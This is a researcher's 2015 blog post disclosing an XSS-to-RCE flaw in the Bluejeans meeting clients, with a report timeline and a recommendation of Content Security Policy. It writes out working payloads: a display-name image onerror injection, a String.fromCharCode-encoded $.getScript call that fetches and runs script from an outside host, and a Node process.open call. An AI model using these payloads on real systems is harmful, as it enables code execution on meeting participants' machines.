---
layout: post
title:  "Jorts: XSS to RCE in Bluejeans"
date:   2015-08-04 17:28:00
categories: xss rce bugbounty
---

## Jorts

Today (4 Aug 2015), I accidentally triggered a cross-site scripting (XSS) vulnerability in Bluejeans that worked when using the web application as well as the native OS X application (and possibly additional clients). Without CSP, XSS attacks using inline event handlers, `javascript:` `href`s, or `eval` are still possible. Nowadays, XSS -> Remote Code Execution (RCE) is also possible. For every person in any meeting that I join, I can execute code on their computer.

# Standup

I entered a meeting with the classic first name of `<img src=x onerror=alert()>` (the [bobby tables](http://xkcd.com/327/) of XSS). A few minutes into the conversation, [toomey] noticed a broken image pop up. Uh oh. When I asked if he also saw an alert box, my colleague [ben] chimed in and said yes.

So we have XSS. Sweet. In at least two clients. Hmmm, this could be bad.

![chat](/assets/xssrce/badtime.jpg)

## eval(prompt())

We noticed that there was some filtering going on (such as stripping quotes), so we'd have to use `String.toCharCode` to generate any string values. The web app enforced a value length but this is easily bypassed with a proxy and was not enforced in the desktop client. I'm sure the client side validation could have been bypassed, but burp was already running and [foxyproxy](https://getfoxyproxy.org/) is exactly what I need most of the time. [ben] quickly came up with a good way to explore the impact of this xss with a simple debug console:

`<img src=x onerror=eval(prompt())>` (35 chars)

This let us generate payloads without having to generate `toCharCode` code each time. Sure this isn't difficult, but an executing prompt is so much easier to use.

## Exploring the native app

[greg] took a look at the bluejeans native application and noticed it used Node. Perhaps `process.open` would work.

It did.

![chat](/assets/xssrce/process.png)

## Putting it all together

That's when [ben] put everything together using a very short payload:

`<img src=x onerror=$.getScript(String.fromCharCode(47,47,120,111,114,46,99,99))>` (80 chars)

Now join any existing meeting and enter the above payload as your name. Everyone in the room see an alert box. Those using the native apps will also see their calculators open.

![Username](/assets/xssrce/username.png)

![Alert](/assets/xssrce/alert.png)

![Calculator!](/assets/xssrce/calc.png)

## How it works

The use of `String.fromCharCode` is just a classic way to bypass filtering/escaping of quotes. `String.fromCharCode(47,47,120,111,114,46,99,99)` is `//xor.cc`.

The payload can be simplified as:

`<img src=x onerror=$.getScript("//xor.cc")>`

[`$.getScript`](https://api.jquery.com/jquery.getscript/) tells jQuery to fetch and execute the javascript at `xor.cc`. Yep, an image that failed to load eventually fetched and executed even more javascript. The fetched javascript that opens the calculator is:

`process.open("/Applications/Calculator.app/Contents/MacOS/Calculator");` (72 chars)

## Why it sort of matters

XSS is XSS is XSS. But XSS in an app with an API to the filesystem is XSS is worse. Bluejeans meetings typically are... unauthenticated. Everyone raise your hand. Now put down your hand if you have required password authentication for every meeting you have joined. Look to your left, look to your right, and notice that nobody's hand is up. If you've used bluejeans, chance are you've used it in a manner that let's this exploit work on any publicly known or guessable bluejeans meeting ID. I did not try to brute force the meeting space for open meetings. That would have been bad.

## Calculators

You can't have a good exploit unless calculators are involved. See [PDF content-type sniffing](https://bounty.github.com/researchers/avlidienbrunn.html) for an even better use of calculators in an attack.

![calc!!!](/assets/xssrce/igotcalc.png)

## Bounty report process

I could not find any contact information or bug bounty, so I emailed security@bluejeans.com and got a response very quickly.

* Reported: 8/4/2015 1:28PM
* First Response: 8/4/2015 2:04PM
* Details Provided: 8/4/2015 2:51PM
* Confirmation of receipt: 8/4/2015 3:21PM
* Issue confirmed, triaged: 8/4/2015 5:58PM
* I followed up: 8/24/2015 1:55PM
* The responded saying they have a fix for an upcoming release: 8/24/2015 9:24PM

## Conclusion

Big ups to the GitHub appsec team. Within one hour we went from XSS to RCE. And it played out like something in one of those movies or TV shows. "We popped a faux console using eval and prompt while ripping open the binary to leverage a libary with system access to perform remote code execution... to open a calculator." Most of the credit has to go to [ben] and [greg], I just found XSS and I wouldn't have even known without [toomey].

![chat](/assets/xssrce/chat.png)

And of course, one thing that would have prevented this from happening: Content Security Policy. Certainly preventing an XSS from turning into an RCE is important, but the RCE would not have been possible without the XSS and CSP would have stopped it, no matter how poorly the data was validated or escaped.

[toomey]: https://twitter.com/patricktoomey "@patricktoomey"
[ben]: https://twitter.com/mastahyeti "@mastahyeti"
[greg]: https://twitter.com/gose1 "@gose1"
